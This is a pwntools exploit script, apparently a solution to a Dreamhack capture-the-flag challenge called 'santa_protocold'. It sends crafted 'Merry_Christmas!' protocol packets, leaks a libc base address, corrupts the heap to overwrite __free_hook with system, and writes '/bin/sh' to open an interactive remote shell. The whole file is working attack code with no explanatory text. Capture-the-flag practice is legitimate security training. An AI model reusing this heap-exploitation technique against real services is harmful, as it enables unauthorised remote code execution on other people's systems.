from pwn import *

#p=process('./santa_protocold')
p = remote('0', 32912)
#p = remote("host3.dreamhack.games",14053)
context.log_level = 'DEBUG'

buf = b'Merry_Christmas!'
buf += p8(0x0) + p8(0x1)
buf += p16(0x0) + p16(0x0)
p.send(buf)

p.recvuntil(b'stderr addr: 0x')
libc_base = int(p.recvn(12),16) - 0x3ec680
print(f'libc_base = {hex(libc_base)}')

p.close()



raw_input()
p = remote('0', 32912)
#p = remote("host3.dreamhack.games",14053)

buf = b'Merry_Christmas!'
buf += p8(0x0) + p8(0x2)
buf += p16(0x0) + p16(0x0) + p16(0x0)
p.send(buf); time.sleep(0.5)

buf = b'Merry_Christmas!'
buf += p8(0x0) + p8(0x4)
buf += p16(0x0) + p16(0x0) + p16(0x0)
p.send(buf); time.sleep(0.5)
p.sendline(b'a'); time.sleep(0.5)

buf = b'Merry_Christmas!'
buf += p8(0x0) + p8(0x5)
buf += p16(0x0) + p16(0x0) + p16(0x0)
p.send(buf); time.sleep(0.5)

system_addr = libc_base+0x4f420
free_hook = libc_base+0x3ed8e8

buf = b'Merry_Christmas!'
buf += p8(0x0) + p8(0x4)
buf += p16(0x0) + p16(0x0) + p16(0x0)
p.send(buf)
p.sendline(b'\x00'*0x10+p64(0x0)+p64(0x31)+p64(free_hook-0x8)+p64(0x0)+b'\x00'*0x10+p64(0x0)+p64(0x21)); time.sleep(1)

buf = b'Merry_Christmas!'
buf += p8(0x0) + p8(0x5)
buf += p16(0x0) + p16(0x0) + p16(0x0)
p.send(buf)

buf = b'Merry_Christmas!'
buf += p8(0x0) + p8(0x4)
buf += p16(0x0) + p16(0x40-1,endian='big') + p16(0x0)
p.send(buf)
p.sendline(b'/bin/sh\x00'+p64(system_addr)); time.sleep(1)

buf = b'Merry_Christmas!'
buf += p8(0x0) + p8(0x5)
buf += p16(0x0) + p16(0x0) + p16(0x0)
p.send(buf)
p.interactive()
